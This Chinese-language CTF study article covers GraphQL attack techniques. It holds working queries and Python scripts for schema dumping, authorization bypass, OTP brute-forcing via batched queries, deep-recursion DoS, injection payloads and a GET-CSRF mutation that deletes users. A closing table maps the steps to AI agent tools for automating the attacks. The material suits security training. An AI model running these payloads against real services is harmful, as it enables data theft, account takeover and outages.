---
id: "ctf-website/03-injection/graphql"
title: "GraphQL 攻击实战"
title_en: "GraphQL Attack Techniques"
summary: >
  全面覆盖 GraphQL API 的 12 种攻击方法，包括 Introspection 拖 Schema、字段级授权绕过、Batch Query 绕过速率限制、Alias 滥用、Fragment 越权、深度递归 DoS、底层注入、WebSocket Subscription 攻击、Persisted Queries 滥用及 Field Suggestions 信息泄露。
summary_en: >
  A comprehensive guide to 12 GraphQL attack techniques including introspection schema dumping, field-level authorization bypass, batch query rate-limit bypass, alias abuse, fragment privilege escalation, deep recursion DoS, underlying injection, WebSocket subscription attacks, persisted query abuse, and field suggestion information disclosure.
board: "ctf-website"
category: "03-injection"
signals: ["GraphQL", "introspection", "schema", "batch query", "alias", "fragment", "subscription", "field suggestion"]
mcp_tools: ["http_probe", "kb_router"]
keywords: ["GraphQL攻击", "introspection", "GraphQL注入", "batch query", "alias绕过", "DoS", "subscription", "clairvoyance"]
difficulty: "intermediate"
tags: ["injection", "graphql", "api", "web-security", "dos", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---

# GraphQL 攻击实战

## 环境判断

```
信号:
- /graphql, /api/graphql, /gql, /query
- POST body 含 "query" 或 "mutation"
- 响应含 "data" + "errors" 结构
- 响应头: Content-Type: application/json
- 报错含 "__typename" "Cannot query field" "GraphQLError"
```

## 0. 传输层与解析器差异

GraphQL 不只是一条 `POST /graphql`。同一个 resolver 可能被 JSON body、GET query、batch array、multipart upload、WebSocket subscription、persisted query 多种入口触发，过滤器经常只覆盖其中一种。

| 入口 | 请求形态 | 打点动作 | 命中信号 |
|---|---|---|---|
| JSON POST | `{"query":"{__typename}"}` | 基础查询、mutation、variables | `data.__typename` |
| GET | `/graphql?query={__typename}` | 测 cache、CSRF、URL decode 差异 | GET mutation 被执行 |
| Batch array | `[{"query":"..."},{"query":"..."}]` | 单请求多 resolver | 返回 JSON 数组 |
| Alias | `a:user(id:1){...}` | 同 resolver 多次执行 | 同响应里出现多个别名 |
| Multipart | `operations` + `map` + file part | 文件上传 resolver | `Upload` scalar 或 multipart 错误 |
| WebSocket | `connection_init` → `subscribe` | subscription / live query | `connection_ack` |
| APQ | `extensions.persistedQuery` | hash lookup/注册 | `PersistedQueryNotFound` |

先用 `{__typename}` 测入口，再切换 transport；如果 POST 被拦，GET、batch、APQ 经常还能触发同一 resolver。

## 1. Introspection 拖 Schema

```graphql
# 基础 introspection（如果未禁用）
{
  __schema {
    queryType { name fields { name type { name kind } } }
    mutationType { name fields { name type { name kind } args { name } } }
    types { name kind fields { name type { name kind ofType { name } } } }
  }
}

# 绕过 introspection 禁用 (分段查询)
{ __typename }
{ __schema { types { name } } }       # 先拿 type 名称
{ __type(name: "User") { fields { name type { name } } } }  # 再逐 type 拿字段

# 用别名绕过速率限制/重复字段限制
query {
  a: __type(name: "User") { fields { name } }
  b: __type(name: "Admin") { fields { name } }
  c: __type(name: "Flag") { fields { name } }
}
```

## 2. 字段级授权绕过

```python
# 拖到 schema 后，直接查不该看到的字段
# 假设 schema 暴露了 User { id, email, password, role, isAdmin }

MUTATIONS = [
    # 查管理员
    'query { users { id email role isAdmin } }',
    # 查所有用户
    'query { allUsers { id email password } }',
    # 查 flag
    'query { flag }',
    'query { system { flag } }',
    'query { config { secretKey } }',
    # mutation 滥用
    'mutation { deleteUser(id: 1) { success } }',
    'mutation { promoteUser(id: 123, role: "admin") { success } }',
    # 跨类型关联
    'query { user(id: 1) { posts { comments { author { email } } } } }',
]
```

## 3. Batch Query 绕过 Rate Limit

```python
# 单请求发多条 query，绕过基于请求数的速率限制
import requests, json

def batch_attack(endpoint: str, queries: list[str]):
    """将多条 query 打包到同一个 POST body"""
    # 方式 1: 数组
    body = [{"query": q} for q in queries]
    r = requests.post(endpoint, json=body)
    return r.json()

    # 方式 2: 别名 (aliases) — 同一 query 重复执行
    aliases = {}
    for i, q in enumerate(queries):
        aliases[f"q{i}"] = q
    # → query q0 { ... } query q1 { ... } ...

# 实战: Bypass OTP bruteforce protection
otp_queries = [
    f'mutation {{ verifyOtp(code: "{c:06d}") {{ success }} }}'
    for c in range(0, 1000000, 1000)
]
# 每 1000 条打包一次 send
```

### A. Alias / Batch 生成器

```python
import json
import requests

def alias_query(field: str, ids: list[int], selection="id email role"):
    body = ["query {"]
    for i in ids:
        body.append(f"  u{i}: {field}(id: {json.dumps(str(i))}) {{ {selection} }}")
    body.append("}")
    return "\n".join(body)

def send_alias(endpoint, cookie, field="user", start=1, stop=50):
    q = alias_query(field, list(range(start, stop + 1)))
    r = requests.post(endpoint, json={"query": q}, headers={"Cookie": cookie})
    print(r.status_code, r.text[:1000])

def send_batch(endpoint, queries):
    r = requests.post(endpoint, json=[{"query": q} for q in queries])
    print(r.status_code)
    print(r.text[:2000])

send_alias("https://target/graphql", "session=xxx")
```

判断方式：

- 如果别名全部返回但普通循环触发限制，说明限制绑定在 HTTP request 数。
- 如果只返回前 N 个别名，说明服务端有 complexity/cost limiter，改用 batch array 或拆字段。
- 如果 error path 带 `path:["u17","email"]`，可以直接定位哪个 id/字段触发权限差异。

## 4. Alias 滥用

```graphql
# 同一 mutation 用不同别名多次执行
mutation {
    a: createInviteCode { code }
    b: createInviteCode { code }
    c: createInviteCode { code }
}
# → 一次性生成 3 个邀请码，可能绕过每日限制

# 同一 query 获取不同用户
query {
    u1: user(id: 1) { email }
    u2: user(id: 2) { email }
    u3: user(id: 3) { email }
}
# → 绕过 "每次查询只允许一个用户" 的限制
```

## 5. Fragment/Inline Fragment 越权

```graphql
# 利用 inline fragment 试探隐藏类型
query {
    node(id: "xxx") {
        ... on Admin { secretKey }
        ... on User { email }
        ... on Flag { value }
    }
}

# Union type 利用
query {
    search(term: "a") {
        ... on User { email }
        ... on Admin { password }   # Admin 可能继承 User
    }
}
```

## 6. 深度递归 DoS (Cost Limit)

```graphql
# 构造深度嵌套查询耗尽服务端资源
query {
    users {
        posts {
            comments {
                author {
                    posts {
                        comments {
                            author {
                                posts {
                                    comments { author { id } }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

## 7. 注入类

```python
# GraphQL 的底层通常是 SQL/NoSQL/ORM
# 参数位置可能仍然存在注入

# SQLi via GraphQL argument
# query { user(id: "1 OR 1=1") { email } }

# NoSQLi via GraphQL filter
# query { users(filter: {email: {"$regex": ".*"}}) { email password } }

# SSTI via GraphQL (如果后端用模板渲染错误信息)
# query { user(id: "{{7*7}}") { email } }
```

## 8. Subscription (WebSocket) 攻击

```graphql
# GraphQL Subscription 走 WebSocket
subscription {
    userCreated { id email password }
}
# 实时收到新用户数据 — 可能包含不该发的字段

# 探测: 用 wsrepl 连接 /graphql (ws:// 模式)
# 发送: {"type":"connection_init","payload":{}}
# 收到: {"type":"connection_ack"}
# 发送: {"id":"1","type":"start","payload":{"query":"subscription { flagChanged { flag } }"}}
```

## 9. Persisted Queries 滥用

```graphql
# 如果服务端注册了持久化查询 (persisted queries)
# 攻击者可能:
# 1. 猜测/枚举已知 query hash
# 2. 发送已注册的 query 但附带额外字段

# 探测
POST /graphql HTTP/1.1
{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash>"}}}

# 如果服务端说 "PersistedQueryNotFound" →
# 可以发送同样的 hash + 完整 query 一起注册
```

### A. APQ 注册/查找细节

Apollo Persisted Query 常见状态：

| 响应 | 含义 | 下一步 |
|---|---|---|
| `PersistedQueryNotFound` | hash 未注册 | 带同 hash + 完整 query 再发一次 |
| `PersistedQueryNotSupported` | APQ 关闭 | 回普通 POST |
| `sha256Hash does not match query` | hash 算错或服务端二次规范化 | 重新按原始 query 字节算 |
| `data` 正常返回 | hash 命中 | 枚举历史 hash 或复用已知 query |

```python
import hashlib
import requests

def apq(endpoint, query, variables=None):
    h = hashlib.sha256(query.encode()).hexdigest()
    body = {
        "operationName": None,
        "variables": variables or {},
        "extensions": {"persistedQuery": {"version": 1, "sha256Hash": h}},
    }
    r1 = requests.post(endpoint, json=body)
    print("[lookup]", r1.text[:300])
    body["query"] = query
    r2 = requests.post(endpoint, json=body)
    print("[register/execute]", r2.text[:1000])

apq("https://target/graphql", "query { __typename }")
```

CTF 常见错配：网关按 hash 放行，后端仍执行 body 里的 `query`；或者缓存层只把 hash 作为 key，未把 `variables`、用户身份、租户字段纳入 key。

## 10. Field Suggestions 信息泄露

```bash
# Apollo Server 默认开启 field suggestions
# query { user(id: 1) { doesnotexist } }
# → "Cannot query field 'doesnotexist' on type 'User'. Did you mean 'email' or 'password'?"
# → 利用这个泄露所有字段名

# 自动提取脚本:
curl -s 'https://target.com/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ users { doesnotexist } }"}' | jq '.errors[].message'
```

### A. Suggestion 递归拖字段

```python
import re
import requests

SUG = re.compile(r"Did you mean ([^?]+)\\?")

def suggestion_probe(endpoint, typename_path="users", seed="zzzzzz"):
    q = f"query {{ {typename_path} {{ {seed} }} }}"
    r = requests.post(endpoint, json={"query": q})
    msg = " ".join(e.get("message", "") for e in r.json().get("errors", []))
    m = SUG.search(msg)
    if not m:
        print(msg[:500])
        return []
    fields = re.findall(r"'([^']+)'", m.group(1))
    print(typename_path, fields)
    return fields

for guess in ["id", "email", "password", "secret", "flag", "admin", "token"]:
    suggestion_probe("https://target/graphql", "user(id:1)", guess + "x")
```

拿到字段名后不要只查当前类型：继续通过关联字段扩展 `user.posts.author.email`、`team.members.role`、`viewer.organization.secrets`。GraphQL 的越权经常出现在“顶层 resolver 鉴权，子字段 resolver 忘记鉴权”。

## 11. GET 方法 CSRF

```bash
# 如果 GraphQL 接受 GET:
curl "https://target.com/graphql?query=mutation+%7B+deleteAllUsers+%7B+success+%7D+%7D"
# → 可在 <img> 标签中触发，绕过 CORS/CSRF token
```

## 12. Variables / Fragment 边界条件

```graphql
# 默认值混淆：服务端只校验 variables，实际 resolver 使用 query default
query GetUser($id: ID = "1") {
  user(id: $id) { id email role }
}

# 类型包装：ID/String/Int 在 resolver 中被 ORM 自动转换
query {
  user(id: "0001") { id email }
  bySlug(slug: ["admin"]) { id }
}

# Fragment 复用：绕过“字段名出现次数”过滤
fragment f on User { email role isAdmin }
query { user(id: 1) { ...f ...f ...f } }
```

边界判断：

- `Variable "$id" got invalid value`：GraphQL 类型层拦住了，还没进 resolver。
- `Cannot return null for non-nullable field`：resolver 已执行，但下游数据或权限返回 null。
- `path` 指向子字段：顶层对象拿到了，问题在字段 resolver。
- `extensions.code` 为业务错误：已经越过 GraphQL parser，开始打业务逻辑。

---

## 工具链

```bash
# Graphw00f — 指纹
python3 graphw00f.py -t https://target.com/graphql

# Clairvoyance — 绕过 introspection 禁用提取 schema
python3 clairvoyance.py -o schema.json https://target.com/graphql

# GraphQL Cop (Burp) — 安全扫描
# InQL (Burp) — IDE + 攻击
# CrackQL — 批量爆破/注入
python3 crackql.py -t https://target.com/graphql -q queries.graphql -w wordlist.txt

# BatchQL — schema 检查 + 批量 query
# https://batchql.com
```

## Evidence

记录: introspection/schema JSON、field suggestion 泄露字段名、transport 类型、operationName、variables、batch/alias 数量、subscription 连接消息、APQ hash 与响应、成功字段路径和失败样本。

## 13. 攻击链

```
GraphQL Introspection → 完整 Schema → 发现 admin{flag} → 直接查询
GraphQL Alias 批量 → 绕过 1 query/min rate limit → 批量数据导出
GraphQL Batch → 绕过 OTP verify → 暴力破解 → Account Takeover
GraphQL field suggestion → 逐字段泄露 → 拼出完整数据模型
GraphQL → NoSQLi in filter → $regex 盲注 → 拖库
GraphQL Subscription → WebSocket → 实时监听 flag 变化
GraphQL GET → CSRF → mutation 执行 → 删号/转账
GraphQL + sqlmap → 底层 SQLi → 读文件 → RCE
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| GraphQL 端点探测 | `http_probe` | GET /graphql?query={__schema{types{name}}} |
| 按信号查技术 | `kb_router` | 搜索 graphql 相关技术文件 |

